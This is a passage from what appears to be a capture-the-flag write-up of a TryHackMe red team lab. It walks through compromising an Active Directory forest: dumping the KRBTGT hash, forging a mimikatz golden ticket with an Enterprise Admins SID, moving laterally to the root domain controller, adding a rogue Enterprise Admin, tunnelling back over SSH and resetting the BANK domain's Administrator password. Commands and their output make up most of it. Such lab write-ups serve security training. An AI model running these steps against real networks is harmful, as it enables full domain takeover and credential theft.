</span></pre></table></code></div></div><p><strong>Parent Child Trust:</strong> When new child domains are added, a two-way transitive trust is automatically established by Active Directory between the child domain and its parent.</p><p><strong>Transitive Trust:</strong> A two-way relationship is automatically created between parent and child domains in a Microsoft Active Directory forest. When a new domain is created, it shares resources with its parent domain by default, enabling an authenticated user to access resources in both the child and parent domains.</p><p><strong>Bidirectional:</strong> Users of both domains can access resources in the other domain.</p><p>Let’s simplify it with the following diagram:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/N-RedTeamCC/trustissue.png" alt="Untitled" /></p><p>As the CORP child trusts the ROOT domain and the BANK domain also trusts the ROOT domain also, then both the CORP and BANK domains will trust each other as the trust type is transitive. Therefore, if we compromise a child domain, we can access the other child domain.</p><h3 id="exploiting-transitive-trust"><strong>Exploiting Transitive Trust</strong></h3><p>A Golden Ticket attack is a way of creating a forged TGT with a stolen KDC key, which enables us to gain access to any service on the domain, essentially becoming our own Ticket Granting Server (TGS). In order to perform a Golden Ticket attack, we will need the following information:</p><ul><li>The Full Qualified Domain Name (FQDN) of the Domain<li>The Security Identified (SID) of the Domain<li>The username of the account that we want to impersonate<li>The KRBTGT password hash</ul><p>This allows us to forge Golden Tickets and access any resource in the CORP domain. However, we need to be able to forge an Inter-Realm TGT in order to become Enterprise Admins (EA) and access any resource in the ROOT domain. We need to exploit the trust between the parent domain and the child domain by adding the SID of the Enterprise Admins (EA) group as an extra SID to our forged ticket, allowing us to have Administrative privileges over the entire forest. So, we also need the following information in order to craft our Golden Ticket:</p><ul><li>The SID of the child Domain Controller (CORPDC)<li>The SID of the Enterprise Admins (EA) from the parent domain (ROOTDC)</ul><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
</pre><td class="rouge-code"><pre><span class="c"># Getting KRBTGT Hash </span><span class="w">
</span><span class="err">$</span><span class="w"> </span><span class="n">proxychains</span><span class="w"> </span><span class="nt">-q</span><span class="w"> </span><span class="nx">impacket-secretsdump</span><span class="w"> </span><span class="nx">corp.thereserve.loc/svcScanning:</span><span class="s1">'Password1!'</span><span class="err">@</span><span class="nx">10.200.x.102</span><span class="w">
</span><span class="n">Impacket</span><span class="w"> </span><span class="nx">v0.10.1.dev1</span><span class="o">+</span><span class="nx">20230223.202738.f4b848fa</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nx">Copyright</span><span class="w"> </span><span class="nx">2022</span><span class="w"> </span><span class="nx">Fortra</span><span class="w">
</span><span class="n">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0c757a3445acb94a654554f3ac529ede:::</span><span class="w">

</span><span class="c"># Getting CORP domain SID</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Windows\Tasks</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Get-DomainSid</span><span class="w">
</span><span class="n">S-1-5-21-170228521-1485475711-3199862024</span><span class="w">

</span><span class="c"># Getting Enterprise Admins Group SID for ROOTDC domain </span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Windows\Tasks</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Get-ADGroup</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="s1">'Enterprise Admins'</span><span class="w"> </span><span class="nt">-Server</span><span class="w"> </span><span class="nx">ROOTDC.thereserve.loc</span><span class="w">
</span><span class="n">DistinguishedName</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="nx">CN</span><span class="o">=</span><span class="n">Enterprise</span><span class="w"> </span><span class="nx">Admins</span><span class="p">,</span><span class="nx">CN</span><span class="o">=</span><span class="n">Users</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">thereserve</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">loc</span><span class="w">
</span><span class="nx">GroupCategory</span><span class="w">     </span><span class="p">:</span><span class="w"> </span><span class="nx">Security</span><span class="w">
</span><span class="n">GroupScope</span><span class="w">        </span><span class="p">:</span><span class="w"> </span><span class="nx">Universal</span><span class="w">
</span><span class="n">Name</span><span class="w">              </span><span class="p">:</span><span class="w"> </span><span class="nx">Enterprise</span><span class="w"> </span><span class="nx">Admins</span><span class="w">
</span><span class="n">ObjectClass</span><span class="w">       </span><span class="p">:</span><span class="w"> </span><span class="nx">group</span><span class="w">
</span><span class="n">ObjectGUID</span><span class="w">        </span><span class="p">:</span><span class="w"> </span><span class="nx">6e883913-d0cb-478e-a1fd-f24d3d0e7d45</span><span class="w">
</span><span class="n">SamAccountName</span><span class="w">    </span><span class="p">:</span><span class="w"> </span><span class="nx">Enterprise</span><span class="w"> </span><span class="nx">Admins</span><span class="w">
</span><span class="n">SID</span><span class="w">               </span><span class="p">:</span><span class="w"> </span><span class="nx">S-1-5-21-1255581842-1300659601-3764024703-519</span><span class="w">

</span><span class="c"># Creating the Golden Ticket</span><span class="w">
</span><span class="n">mimikatz</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="nx">privilege::debug</span><span class="w">
</span><span class="n">Privilege</span><span class="w"> </span><span class="s1">'20'</span><span class="w"> </span><span class="nx">OK</span><span class="w">
</span><span class="n">mimikatz</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="nx">kerberos::golden</span><span class="w"> </span><span class="nx">/user:Administrator</span><span class="w"> </span><span class="nx">/domain:corp.thereserve.loc</span><span class="w"> </span><span class="nx">/sid:S-1-5-21-170228521-1485475711-3199862024</span><span class="w"> </span><span class="nx">/service:krbtgt</span><span class="w"> </span><span class="nx">/rc4:0c757a3445acb94a654554f3ac529ede</span><span class="w"> </span><span class="nx">/sids:S-1-5-21-1255581842-1300659601-3764024703-519</span><span class="w"> </span><span class="nx">/ptt</span><span class="w">
</span><span class="n">User</span><span class="w">      </span><span class="p">:</span><span class="w"> </span><span class="nx">Administrator</span><span class="w">
</span><span class="n">Domain</span><span class="w">    </span><span class="p">:</span><span class="w"> </span><span class="nx">corp.thereserve.loc</span><span class="w"> </span><span class="p">(</span><span class="n">CORP</span><span class="p">)</span><span class="w">
</span><span class="n">SID</span><span class="w">       </span><span class="p">:</span><span class="w"> </span><span class="nx">S-1-5-21-170228521-1485475711-3199862024</span><span class="w">
</span><span class="n">User</span><span class="w"> </span><span class="nx">Id</span><span class="w">   </span><span class="p">:</span><span class="w"> </span><span class="nx">500</span><span class="w">
</span><span class="n">Groups</span><span class="w"> </span><span class="nx">Id</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="o">*</span><span class="nx">513</span><span class="w"> </span><span class="nx">512</span><span class="w"> </span><span class="nx">520</span><span class="w"> </span><span class="nx">518</span><span class="w"> </span><span class="nx">519</span><span class="w">
</span><span class="n">Extra</span><span class="w"> </span><span class="nx">SIDs:</span><span class="w"> </span><span class="nx">S-1-5-21-1255581842-1300659601-3764024703-519</span><span class="w"> </span><span class="p">;</span><span class="w">
</span><span class="n">ServiceKey:</span><span class="w"> </span><span class="nx">0c757a3445acb94a654554f3ac529ede</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nx">rc4_hmac_nt</span><span class="w">
</span><span class="n">Service</span><span class="w">   </span><span class="p">:</span><span class="w"> </span><span class="nx">krbtgt</span><span class="w">
</span><span class="n">Lifetime</span><span class="w">  </span><span class="p">:</span><span class="w"> </span><span class="nx">7/14/2024</span><span class="w"> </span><span class="nx">4:18:13</span><span class="w"> </span><span class="nx">PM</span><span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="mi">7</span><span class="n">/12/2034</span><span class="w"> </span><span class="nx">4:18:13</span><span class="w"> </span><span class="nx">PM</span><span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="mi">7</span><span class="n">/12/2034</span><span class="w"> </span><span class="nx">4:18:13</span><span class="w"> </span><span class="nx">PM</span><span class="w">
</span><span class="o">-</span><span class="err">&gt;</span><span class="w"> </span><span class="n">Ticket</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="o">**</span><span class="w"> </span><span class="nx">Pass</span><span class="w"> </span><span class="nx">The</span><span class="w"> </span><span class="nx">Ticket</span><span class="w"> </span><span class="o">**</span><span class="w">

 </span><span class="o">*</span><span class="w"> </span><span class="n">PAC</span><span class="w"> </span><span class="nx">generated</span><span class="w">
 </span><span class="o">*</span><span class="w"> </span><span class="n">PAC</span><span class="w"> </span><span class="nx">signed</span><span class="w">
 </span><span class="o">*</span><span class="w"> </span><span class="n">EncTicketPart</span><span class="w"> </span><span class="nx">generated</span><span class="w">
 </span><span class="o">*</span><span class="w"> </span><span class="n">EncTicketPart</span><span class="w"> </span><span class="nx">encrypted</span><span class="w">
 </span><span class="o">*</span><span class="w"> </span><span class="n">KrbCred</span><span class="w"> </span><span class="nx">generated</span><span class="w">

</span><span class="n">Golden</span><span class="w"> </span><span class="nx">ticket</span><span class="w"> </span><span class="nx">for</span><span class="w"> </span><span class="s1">'Administrator @ corp.thereserve.loc'</span><span class="w"> </span><span class="nx">successfully</span><span class="w"> </span><span class="nx">submitted</span><span class="w"> </span><span class="nx">for</span><span class="w"> </span><span class="nx">current</span><span class="w"> </span><span class="nx">session</span><span class="w">

</span><span class="n">C:\Windows\system32</span><span class="err">&gt;</span><span class="nx">dir</span><span class="w"> </span><span class="nx">\\rootdc.thereserve.loc\c</span><span class="err">$</span><span class="w">
 </span><span class="n">Volume</span><span class="w"> </span><span class="nx">in</span><span class="w"> </span><span class="nx">drive</span><span class="w"> </span><span class="nx">\\rootdc.thereserve.loc\c</span><span class="err">$</span><span class="w"> </span><span class="nx">has</span><span class="w"> </span><span class="nx">no</span><span class="w"> </span><span class="nx">label.</span><span class="w">
 </span><span class="n">Volume</span><span class="w"> </span><span class="nx">Serial</span><span class="w"> </span><span class="nx">Number</span><span class="w"> </span><span class="nx">is</span><span class="w"> </span><span class="nx">AE32-1DF2</span><span class="w">

 </span><span class="n">Directory</span><span class="w"> </span><span class="nx">of</span><span class="w"> </span><span class="nx">\\rootdc.thereserve.loc\c</span><span class="err">$</span><span class="w">

</span><span class="mi">04</span><span class="n">/01/2023</span><span class="w">  </span><span class="nx">04:10</span><span class="w"> </span><span class="nx">AM</span><span class="w">               </span><span class="nx">427</span><span class="w"> </span><span class="nx">adusers_list.csv</span><span class="w">
</span><span class="mi">03</span><span class="n">/17/2023</span><span class="w">  </span><span class="nx">07:18</span><span class="w"> </span><span class="nx">AM</span><span class="w">                </span><span class="nx">85</span><span class="w"> </span><span class="nx">dns_entries.csv</span><span class="w">
</span><span class="mi">04</span><span class="n">/15/2023</span><span class="w">  </span><span class="nx">08:52</span><span class="w"> </span><span class="nx">PM</span><span class="w">         </span><span class="nx">3</span><span class="p">,</span><span class="nx">162</span><span class="p">,</span><span class="nx">859</span><span class="w"> </span><span class="nx">EC2-Windows-Launch.zip</span><span class="w">
</span><span class="mi">11</span><span class="n">/14/2018</span><span class="w">  </span><span class="nx">07:56</span><span class="w"> </span><span class="nx">AM</span><span class="w">    </span><span class="err">&lt;</span><span class="nx">DIR</span><span class="err">&gt;</span><span class="w">          </span><span class="nx">EFI</span><span class="w">
</span><span class="mi">04</span><span class="n">/15/2023</span><span class="w">  </span><span class="nx">08:52</span><span class="w"> </span><span class="nx">PM</span><span class="w">            </span><span class="nx">13</span><span class="p">,</span><span class="nx">182</span><span class="w"> </span><span class="nx">install.ps1</span><span class="w">
</span><span class="mi">05</span><span class="n">/13/2020</span><span class="w">  </span><span class="nx">06:58</span><span class="w"> </span><span class="nx">PM</span><span class="w">    </span><span class="err">&lt;</span><span class="nx">DIR</span><span class="err">&gt;</span><span class="w">          </span><span class="nx">PerfLogs</span><span class="w">
</span><span class="mi">09</span><span class="n">/07/2022</span><span class="w">  </span><span class="nx">04:58</span><span class="w"> </span><span class="nx">PM</span><span class="w">    </span><span class="err">&lt;</span><span class="nx">DIR</span><span class="err">&gt;</span><span class="w">          </span><span class="nx">Program</span><span class="w"> </span><span class="nx">Files</span><span class="w">
</span><span class="mi">09</span><span class="n">/07/2022</span><span class="w">  </span><span class="nx">04:57</span><span class="w"> </span><span class="nx">PM</span><span class="w">    </span><span class="err">&lt;</span><span class="nx">DIR</span><span class="err">&gt;</span><span class="w">          </span><span class="nx">Program</span><span class="w"> </span><span class="nx">Files</span><span class="w"> </span><span class="p">(</span><span class="n">x86</span><span class="p">)</span><span class="w">
</span><span class="mi">04</span><span class="n">/15/2023</span><span class="w">  </span><span class="nx">08:51</span><span class="w"> </span><span class="nx">PM</span><span class="w">             </span><span class="nx">1</span><span class="p">,</span><span class="nx">812</span><span class="w"> </span><span class="nx">thm-network-setup-dc.ps1</span><span class="w">
</span><span class="mi">07</span><span class="n">/14/2024</span><span class="w">  </span><span class="nx">03:43</span><span class="w"> </span><span class="nx">AM</span><span class="w">    </span><span class="err">&lt;</span><span class="nx">DIR</span><span class="err">&gt;</span><span class="w">          </span><span class="nx">Users</span><span class="w">
</span><span class="mi">09</span><span class="n">/07/2022</span><span class="w">  </span><span class="nx">07:39</span><span class="w"> </span><span class="nx">PM</span><span class="w">    </span><span class="err">&lt;</span><span class="nx">DIR</span><span class="err">&gt;</span><span class="w">          </span><span class="nx">Windows</span><span class="w">
               </span><span class="mi">5</span><span class="w"> </span><span class="n">File</span><span class="p">(</span><span class="n">s</span><span class="p">)</span><span class="w">      </span><span class="nx">3</span><span class="p">,</span><span class="nx">178</span><span class="p">,</span><span class="nx">365</span><span class="w"> </span><span class="nx">bytes</span><span class="w">
               </span><span class="mi">6</span><span class="w"> </span><span class="n">Dir</span><span class="p">(</span><span class="n">s</span><span class="p">)</span><span class="w">  </span><span class="nx">22</span><span class="p">,</span><span class="nx">418</span><span class="p">,</span><span class="nx">341</span><span class="p">,</span><span class="nx">888</span><span class="w"> </span><span class="nx">bytes</span><span class="w"> </span><span class="nx">free</span><span class="w">
</span></pre></table></code></div></div><h3 id="lateral-movement"><strong>Lateral Movement</strong></h3><p>As our golden ticket is loaded into memory, and we have access to the ROOTDC machine, we need to perform lateral movement and establish a shell on this machine. A simple way would be by running psexec remotely on the ROOTDC machine.</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\svcScanning\Desktop</span><span class="err">&gt;</span><span class="w"> </span><span class="o">.</span><span class="nx">\psexec.exe</span><span class="w"> </span><span class="nx">\\ROOTDC.thereverse.loc</span><span class="w"> </span><span class="nx">cmd.exe</span><span class="w">

</span><span class="n">PsExec</span><span class="w"> </span><span class="nx">v2.43</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nx">Execute</span><span class="w"> </span><span class="nx">processes</span><span class="w"> </span><span class="nx">remotely</span><span class="w">
</span><span class="n">Copyright</span><span class="w"> </span><span class="p">(</span><span class="n">C</span><span class="p">)</span><span class="w"> </span><span class="nx">2001-2023</span><span class="w"> </span><span class="nx">Mark</span><span class="w"> </span><span class="nx">Russinovich</span><span class="w">
</span><span class="n">Sysinternals</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nx">www.sysinternals.com</span><span class="w">

</span><span class="n">Couldn</span><span class="s1">'t access ROOTDC.thereverse.loc:
The network path was not found.
</span></pre></table></code></div></div><p>I am not sure why PSexec didn’t work so I tried to use the Wirnm protocol to connect remotely to the ROOTDC machine.</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\svcScanning\Desktop</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">winrs</span><span class="w"> </span><span class="nt">-r</span><span class="p">:</span><span class="nx">rootdc.thereserve.loc</span><span class="w"> </span><span class="nx">cmd.exe</span><span class="w">
</span><span class="n">Microsoft</span><span class="w"> </span><span class="nx">Windows</span><span class="w"> </span><span class="p">[</span><span class="n">Version</span><span class="w"> </span><span class="mf">10.0</span><span class="o">.</span><span class="nf">17763</span><span class="o">.</span><span class="nf">3287</span><span class="p">]</span><span class="w">
</span><span class="p">(</span><span class="n">c</span><span class="p">)</span><span class="w"> </span><span class="nx">2018</span><span class="w"> </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">Corporation.</span><span class="w"> </span><span class="nx">All</span><span class="w"> </span><span class="nx">rights</span><span class="w"> </span><span class="nx">reserved.</span><span class="w">

</span><span class="n">C:\Users\Administrator.CORP</span><span class="err">&gt;</span><span class="nx">whoami</span><span class="w">
</span><span class="n">whoami</span><span class="w">
</span><span class="nx">corp\administrator</span><span class="w">

</span><span class="n">C:\Users\Administrator.CORP</span><span class="err">&gt;</span><span class="nx">hostname</span><span class="w">
</span><span class="n">hostname</span><span class="w">
</span><span class="nx">ROOTDC</span><span class="w">
</span></pre></table></code></div></div><p>Great, now we have administrative access on the RootDC machine “the parent domain”. We are now able to obtain the following flags:</p><ul><li><p><strong><em>Flag 15, Foothold on Parent Domain</em></strong></p><li><p><strong><em>Flag 16, Administrative access to Parent Domain</em></strong></p></ul><h2 id="full-compromise-of-bank-domain"><strong>Full Compromise of BANK Domain</strong></h2><h3 id="persistence-1"><strong>Persistence</strong></h3><p><strong>From ROOTDC Machine</strong></p><p>Great, we have a fully interactive shell, let’s create our own user and add it to the enterprise admin group.</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre><span class="n">C:\Users\Administrator.CORP</span><span class="err">&gt;</span><span class="nx">net</span><span class="w"> </span><span class="nx">user</span><span class="w"> </span><span class="nx">ItsFadinG</span><span class="w"> </span><span class="s2">"Password1!"</span><span class="w"> </span><span class="nx">/domain</span><span class="w">
</span><span class="n">The</span><span class="w"> </span><span class="nx">command</span><span class="w"> </span><span class="nx">completed</span><span class="w"> </span><span class="nx">successfully</span><span class="w">
</span><span class="n">C:\Users\Administrator.CORP</span><span class="err">&gt;</span><span class="nx">net</span><span class="w"> </span><span class="nx">group</span><span class="w"> </span><span class="s2">"Enterprise Admins"</span><span class="w"> </span><span class="nx">ItsFadinG</span><span class="w"> </span><span class="nx">/add</span><span class="w"> </span><span class="nx">/domain</span><span class="w">
</span><span class="n">The</span><span class="w"> </span><span class="nx">command</span><span class="w"> </span><span class="nx">completed</span><span class="w"> </span><span class="nx">successfully.</span><span class="w">

</span><span class="c"># Connecting from Attacking Machine</span><span class="w">
</span><span class="err">┌──</span><span class="p">(</span><span class="n">root</span><span class="err">㉿</span><span class="nx">kali</span><span class="p">)</span><span class="n">-</span><span class="p">[</span><span class="n">~</span><span class="p">]</span><span class="w">
</span><span class="err">└─$</span><span class="w"> </span><span class="n">proxychains</span><span class="w"> </span><span class="nt">-q</span><span class="w"> </span><span class="n">evil</span><span class="nt">-winrm</span><span class="w"> </span><span class="nt">-i</span><span class="w"> </span><span class="mf">10.200</span><span class="o">.</span><span class="nf">x</span><span class="o">.</span><span class="nf">100</span><span class="w"> </span><span class="nt">-u</span><span class="w"> </span><span class="n">ItsFadinG</span><span class="w"> </span><span class="nt">-p</span><span class="w"> </span><span class="s1">'Password1!'</span><span class="w">                           

</span><span class="n">Evil</span><span class="nt">-WinRM</span><span class="w"> </span><span class="n">shell</span><span class="w"> </span><span class="n">v3.</span><span class="mi">4</span><span class="w">
</span><span class="n">Warning</span><span class="p">:</span><span class="w"> </span><span class="n">Remote</span><span class="w"> </span><span class="n">path</span><span class="w"> </span><span class="n">completions</span><span class="w"> </span><span class="n">is</span><span class="w"> </span><span class="n">disabled</span><span class="w"> </span><span class="n">due</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">ruby</span><span class="w"> </span><span class="n">limitation</span><span class="p">:</span><span class="w"> </span><span class="n">quoting_detection_proc</span><span class="p">()</span><span class="w"> </span><span class="n">function</span><span class="w"> </span><span class="n">is</span><span class="w"> </span><span class="n">unimplemented</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="n">this</span><span class="w"> </span><span class="n">machine</span><span class="w">
</span><span class="n">Data</span><span class="p">:</span><span class="w"> </span><span class="n">For</span><span class="w"> </span><span class="n">more</span><span class="w"> </span><span class="n">information</span><span class="p">,</span><span class="w"> </span><span class="n">check</span><span class="w"> </span><span class="n">Evil</span><span class="nt">-WinRM</span><span class="w"> </span><span class="n">Github</span><span class="p">:</span><span class="w"> </span><span class="n">https</span><span class="p">:</span><span class="n">//github.com/Hackplayers/evil-winrm</span><span class="c">#Remote-path-completion</span><span class="w">
</span><span class="n">Info</span><span class="p">:</span><span class="w"> </span><span class="n">Establishing</span><span class="w"> </span><span class="n">connection</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">remote</span><span class="w"> </span><span class="n">endpoint</span><span class="w">
</span><span class="o">*</span><span class="n">Evil</span><span class="nt">-WinRM</span><span class="o">*</span><span class="w"> </span><span class="n">PS</span><span class="w"> </span><span class="n">C:\Users\ItsFadinG\Documents</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">hostname</span><span class="w">
</span><span class="n">ROOTDC</span><span class="w">
</span></pre></table></code></div></div><h3 id="port-forwarding"><strong>Port Forwarding</strong></h3><p>We are now having access to the ROOTDC therefore, from here we can access the child domain BANK.thereverse.loc but we can’t access it directly from our own attacking machine. Therefore, we need to establish tunneling from the ROOTDC. We are assigned two interfaces, one for the tryhackme VPN and the other for the Corp VPN, from that, we previously accessed the internal network.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre>┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-[~/THM/N-RedTeamCC/proxychains]
└─<span class="nv">$ </span>ifconfig     
tun0: <span class="nv">flags</span><span class="o">=</span>4305&lt;UP,POINTOPOINT,RUNNING,NOARP,MULTICAST&gt;  mtu 1500
        inet 10.50.87.39  netmask 255.255.255.0  destination 10.50.87.39
        inet6 fe80::4eaf:39ba:b250:d638  prefixlen 64  scopeid 0x20&lt;<span class="nb">link</span><span class="o">&gt;</span>
        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 500  <span class="o">(</span>UNSPEC<span class="o">)</span>
        RX packets 1211  bytes 692035 <span class="o">(</span>675.8 KiB<span class="o">)</span>
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1078  bytes 473631 <span class="o">(</span>462.5 KiB<span class="o">)</span>
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

tun1: <span class="nv">flags</span><span class="o">=</span>4305&lt;UP,POINTOPOINT,RUNNING,NOARP,MULTICAST&gt;  mtu 1500
        inet 12.100.1.x  netmask 255.255.255.0  destination 12.100.1.x
        inet6 fe80::90f7:43f8:282d:b3f8  prefixlen 64  scopeid 0x20&lt;<span class="nb">link</span><span class="o">&gt;</span>
        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 500  <span class="o">(</span>UNSPEC<span class="o">)</span>
        RX packets 1548  bytes 457422 <span class="o">(</span>446.7 KiB<span class="o">)</span>
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1405  bytes 263422 <span class="o">(</span>257.2 KiB<span class="o">)</span>
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
</pre></table></code></div></div><p>Let’s check which IP is reachable from the ROOTDC.</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="c"># Corp VPN</span><span class="w">
</span><span class="o">*</span><span class="n">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\Users\ItsFadinG\Documents</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">ping</span><span class="w"> </span><span class="nx">12.100.1.x</span><span class="w">
</span><span class="n">Pinging</span><span class="w"> </span><span class="nx">12.100.1.x</span><span class="w"> </span><span class="nx">with</span><span class="w"> </span><span class="nx">32</span><span class="w"> </span><span class="nx">bytes</span><span class="w"> </span><span class="nx">of</span><span class="w"> </span><span class="nx">data:</span><span class="w">
</span><span class="n">Request</span><span class="w"> </span><span class="nx">timed</span><span class="w"> </span><span class="nx">out.</span><span class="w">

</span><span class="c"># Tryhackme VPN</span><span class="w">
</span><span class="o">*</span><span class="n">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\Users\ItsFadinG\Documents</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">ping</span><span class="w"> </span><span class="nx">10.50.87.39</span><span class="w">
</span><span class="n">Pinging</span><span class="w"> </span><span class="nx">10.50.87.39</span><span class="w"> </span><span class="nx">with</span><span class="w"> </span><span class="nx">32</span><span class="w"> </span><span class="nx">bytes</span><span class="w"> </span><span class="nx">of</span><span class="w"> </span><span class="nx">data:</span><span class="w">
</span><span class="n">Reply</span><span class="w"> </span><span class="nx">from</span><span class="w"> </span><span class="nx">10.50.87.39:</span><span class="w"> </span><span class="nx">bytes</span><span class="o">=</span><span class="mi">32</span><span class="w"> </span><span class="n">time</span><span class="o">=</span><span class="mi">192</span><span class="n">ms</span><span class="w"> </span><span class="nx">TTL</span><span class="o">=</span><span class="mi">63</span><span class="w">
</span><span class="n">Reply</span><span class="w"> </span><span class="nx">from</span><span class="w"> </span><span class="nx">10.50.87.39:</span><span class="w"> </span><span class="nx">bytes</span><span class="o">=</span><span class="mi">32</span><span class="w"> </span><span class="n">time</span><span class="o">=</span><span class="mi">94</span><span class="n">ms</span><span class="w"> </span><span class="nx">TTL</span><span class="o">=</span><span class="mi">63</span><span class="w">
</span></pre></table></code></div></div><p>So the tryhackme VPN is reachable there; let’s establish dynamic port forwarding to access the BANKDC machine.</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="o">*</span><span class="n">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\Users\ItsFadinG\Documents</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">ssh</span><span class="w"> </span><span class="nx">tunneluser</span><span class="err">@</span><span class="nx">10.50.87.39</span><span class="w"> </span><span class="nt">-R</span><span class="w"> </span><span class="nx">9060</span><span class="w"> </span><span class="nt">-N</span><span class="w">
</span><span class="n">tunneluser</span><span class="err">@</span><span class="nx">10.50.87.39</span><span class="s1">'s password:
</span></pre></table></code></div></div><p>Let’s RDP to it and check.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-[/]
└─<span class="nv">$ </span>proxychains <span class="nt">-q</span> <span class="nt">-f</span> proxychains4.conf xfreerdp /u:ItsFadinG /p:<span class="s1">'Password1!'</span> +clipboard /dynamic-resolution /cert:ignore /v:10.200.x.101            
<span class="o">[</span>13:26:48:054] <span class="o">[</span>902989:902999] <span class="o">[</span>WARN][com.freerdp.core.nla] - SPNEGO received NTSTATUS: STATUS_LOGON_FAILURE <span class="o">[</span>0xC000006D] from server
<span class="o">[</span>13:26:48:054] <span class="o">[</span>902989:902999] <span class="o">[</span>ERROR][com.freerdp.core] - nla_recv_pdu:freerdp_set_last_error_ex ERRCONNECT_LOGON_FAILURE <span class="o">[</span>0x00020014]
<span class="o">[</span>13:26:48:054] <span class="o">[</span>902989:902999] <span class="o">[</span>ERROR][com.freerdp.core.rdp] - rdp_recv_callback: CONNECTION_STATE_NLA - nla_recv_pdu<span class="o">()</span> fail
<span class="o">[</span>13:26:48:054] <span class="o">[</span>902989:902999] <span class="o">[</span>ERROR][com.freerdp.core.transport] - transport_check_fds: transport-&gt;ReceiveCallback<span class="o">()</span> - <span class="nt">-1</span>
</pre></table></code></div></div><p>Hmm! It is not working, but the error is indicating that the credentials are wrong, which means there is a connectivity between them. So let’s RDP from ROOTDC to BANKDC and rest our password or change the password for the administrator user, then try to connect again.</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="c"># From Administrative powershell</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Windows\system32</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">hostname</span><span class="w">
</span><span class="n">BANKDC</span><span class="w">
</span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\Windows\system32</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">net</span><span class="w"> </span><span class="nx">user</span><span class="w"> </span><span class="nx">Administrator</span><span class="w"> </span><span class="s2">"Password1!"</span><span class="w"> </span><span class="nx">/domain</span><span class="w">
